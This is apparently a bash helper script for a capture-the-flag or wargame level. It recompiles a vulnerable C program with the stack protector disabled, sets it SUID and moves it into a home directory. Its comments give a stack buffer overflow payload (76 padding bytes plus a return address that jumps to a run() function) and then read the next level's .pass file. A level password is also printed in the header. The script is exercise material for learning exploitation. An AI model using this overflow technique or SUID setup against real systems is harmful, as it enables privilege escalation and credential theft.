#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level2@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level2@VM_IP:/tmp                 #
#                                                                               #
#     pwd: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program (https://stackoverflow.com/questions/1345670/stack-smashing-detected)
gcc -fno-stack-protector source.c -o ft_level1

# Set SUID to give root user permissions
chmod u+s ft_level1

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level1 ~


# Then you have to run the program and cat .pass as level1 by taping manually these commands

#	su level1
#	python -c 'print "a" * 76 + "\x64\x84\x04\x08"' > /tmp/exploit         // the new address of run() function is 0x08048464
#	cat /tmp/exploit - | /home/user/level2/ft_level1
#	cat /home/user/level2/.pass
